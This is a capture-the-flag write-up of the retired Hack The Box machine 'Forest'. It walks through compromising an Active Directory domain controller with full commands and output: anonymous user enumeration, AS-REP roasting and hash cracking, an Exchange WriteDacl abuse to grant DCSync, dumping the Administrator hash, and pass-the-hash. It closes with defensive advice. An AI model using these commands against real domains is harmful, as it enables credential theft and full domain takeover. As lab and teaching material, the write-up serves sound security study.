# Forest — Hack The Box, Easy, Windows

**TL;DR:** An anonymous RPC bind lists the domain's users. One of them,
`svc-alfresco`, has Kerberos pre-authentication disabled, so you can AS-REP
roast it with no credentials and crack the result in a second. That account sits
in `Account Operators`, which can write to `Exchange Windows Permissions`, which
holds `WriteDacl` on the domain object — so you add yourself, grant yourself
DCSync, replicate the Administrator hash, and pass it.

*Machine status: retired. Flags shown are from my own run — strip them before
publishing anywhere.*

## Reconnaissance

    nmap -Pn -sCV -p53,88,135,139,389,445,636,5985 10.129.x.x

    88/tcp   kerberos-sec  Microsoft Windows Kerberos
    389/tcp  ldap          Domain: htb.local, Site: Default-First-Site-Name
    445/tcp  microsoft-ds  Windows Server 2016 Standard 14393
    5985/tcp http          Microsoft HTTPAPI httpd 2.0 (WinRM)

Kerberos, LDAP, SMB, global catalog, WinRM, no web. This is a domain controller,
and the target is `htb.local` on a host called `FOREST`. The presence of 5985
matters early: if I recover any credential, WinRM is a shell, not just a
protocol to authenticate against.

`nxc smb` reports null authentication is allowed but share enumeration is denied.
Null auth on a DC is worth more than it looks — it is usually enough to read the
directory.

## Enumeration

The reflex on a DC that permits anonymous binds is to ask it for its users:

    rpcclient -U "" -N 10.129.x.x -c enumdomusers

    ...
    user:[svc-alfresco] rid:[0x47b]
    user:[andy]         rid:[0x47e]
    user:[mark]         rid:[0x47f]

Thirty-one accounts, no credential required. The `HealthMailbox` and `SM_*`
accounts are Exchange noise; the human-looking names and `svc-alfresco` are the
targets. I saved the lot to a file.

The first thing to do with a user list and no password is AS-REP roasting — it
asks the KDC, for each user, whether that user will hand out a preauth-free
ticket. Most will not. One might:

    impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.129.x.x \
        -no-pass -format hashcat

    [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
    ...
    $krb5asrep$23$svc-alfresco@HTB.LOCAL:4f2ed70...

`svc-alfresco` has pre-authentication disabled. That blob is encrypted with its
password, so it is a hash:

    john --format=krb5asrep --wordlist=rockyou.txt asrep.hash
    s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)

One second. `svc-alfresco : s3rvice`.

## Foothold

5985 was open, and the account turns out to be a Remote Management User:

    nxc winrm 10.129.x.x -u svc-alfresco -p s3rvice
    [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)

`user.txt` is on the desktop. One note for anyone scripting this: `nxc`'s WinRM
executor refuses `cmd` here ("no Invoke rights") but PowerShell works — pass
`-X` rather than `-x`.

## Privilege escalation

`whoami /groups` is the tell:

    BUILTIN\Account Operators
    HTB\Privileged IT Accounts

`Account Operators` is the interesting one. It is a low-tier group people rarely
guard, and it can modify most non-protected groups. The question is which of
those groups is worth modifying, and for that I collected the graph rather than
guessing:

    bloodhound-python -u svc-alfresco -p s3rvice -d htb.local \
        -dc forest.htb.local -c All -ns 10.129.x.x --zip

Reading the domain object's ACEs out of the JSON, one non-default group has
`WriteDacl` on the domain head: `Exchange Windows Permissions`, RID 1121,
`admincount=False`. Exchange grants this at install time — its servers are
supposed to manage mail attributes across the domain — and the `WriteDacl` is
the well-known over-reach. `admincount=False` means AdminSDHolder is not
protecting the group, so its own DACL is writable.

And who can write to *that* group? Checking its ACEs, `S-1-5-32-548` —
`Account Operators` — holds `GenericAll` over it. Which I am in.

So the path is: add myself to `Exchange Windows Permissions` (Account Operators
can), then use that group's `WriteDacl` on the domain to grant myself DCSync,
then replicate.

The first attempt failed in an instructive way. I added the group over the WinRM
shell — `net group "Exchange Windows Permissions" svc-alfresco /add /domain`,
"command completed successfully" — and then every DCSync grant returned
`INSUFF_ACCESS_RIGHTS`. Two things were wrong at once. The WinRM session's token
still carried the TGT from *before* the group-add, so it did not see the new
membership. And the machine runs a reset job that reverts state every few
minutes, so even a fresh login raced against it — an LDAP `memberOf` read showed
the membership had already vanished.

The fix is to stop relying on persistent state and a token refresh. Do the whole
thing from Linux, in one window, each step authenticating fresh with the
password rather than a cached ticket:

    net rpc group addmem "Exchange Windows Permissions" svc-alfresco \
        -U htb.local/svc-alfresco%s3rvice -S 10.129.x.x

    impacket-dacledit -action write -rights DCSync -principal svc-alfresco \
        -target-dn "DC=htb,DC=local" htb.local/svc-alfresco:s3rvice -dc-ip 10.129.x.x
    [*] DACL modified successfully!

`net rpc` from Linux has no cached token to go stale, and running the grant
immediately after the add beats the reset job. Then DCSync:

    impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.x.x \
        -just-dc-user Administrator
    htb.local\Administrator:500:aad3b435...:<administrator-nt-hash>:::

And pass the hash:

    nxc winrm 10.129.x.x -u Administrator -H <administrator-nt-hash>
    [+] htb.local\Administrator (Pwn3d!)

`root.txt` on the Administrator desktop.

## What did not work

**Acting through the WinRM token after a group-add.** Covered above, but it is
the main lesson of the box: a Windows access token is fixed at logon. Add a
group and the *existing* session does not gain it — you need a new logon, and on
Kerberos that means a new TGT. Half an hour of "I have the rights, why is it
denied" is usually this.

**Kerberos auth for `dacledit`.** I tried authenticating the grant with a fresh
TGT (`getTGT` + `-k`) to sidestep the token problem. It kept hitting
`KRB_AP_ERR_SKEW` — the DC's clock and mine were minutes apart, and Kerberos will
not tolerate that. `ntpdate` fixes it, but by then the NTLM/password path was
simpler and had no skew sensitivity. On a lab DC, prefer password auth unless you
specifically need Kerberos; you avoid an entire class of clock problem.

## Lessons

AS-REP roasting is the first move against any DC where you can list users, and
you can often list users anonymously. It costs one command and needs zero
credentials — always try it before anything that requires a password.

A Windows access token is immutable for the life of the session. If you gain a
group or a right, the session you are in will not see it; open a new one. This is
the single most common source of "insufficient rights" when the rights are, on
paper, present.

`Account Operators` is not a low-stakes group. Any environment that treats it as
helpdesk-tier, combined with the default Exchange `WriteDacl`-on-domain ACL, has
a direct path from that group to Domain Admin.

## Defensive takeaway

The flashy finding is the AS-REP roast, and it is the one a scanner flags. But
roasting only cost a low-privileged shell. What made this Domain Admin in nine
minutes was a delegated-rights chain — `Account Operators` writing to a group
that can rewrite the domain's DACL — and that is the control worth fixing first:
lock down `Account Operators` to tier-0 handling and remediate the Exchange
split-permissions ACL. Fix those and the roast is an incident, not a breach.

Same shape as every box in this series: the vulnerability that gets the CVE — or
here, the scanner alert — is rarely the one that decides how bad the day gets.
That one is usually a privilege boundary someone widened by installing software
and never revisited.
